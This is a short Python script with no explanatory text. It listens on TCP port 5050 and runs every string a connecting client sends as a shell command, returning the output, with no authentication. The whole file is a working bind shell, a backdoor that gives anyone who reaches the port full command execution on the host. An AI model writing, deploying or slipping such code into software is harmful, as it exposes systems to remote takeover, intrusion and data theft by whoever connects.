import socket
import subprocess


IP = socket.gethostbyname(socket.gethostname())
PORT = 5050


def handle_client_connection(client_socket):
    while True:
        command = client_socket.recv(1024).decode('utf-8')
        if not command:
            break
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = result.stdout + result.stderr
        client_socket.sendall(output)
    client_socket.close()


def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((IP, PORT))
    server_socket.listen(5)
    print(f'Server running and listening on port {PORT}')

    while True:
        client_socket, addr = server_socket.accept()
        print(f'Incoming connection from {addr[0]}:{addr[1]}')
        handle_client_connection(client_socket)


if __name__ == '__main__':
    main()
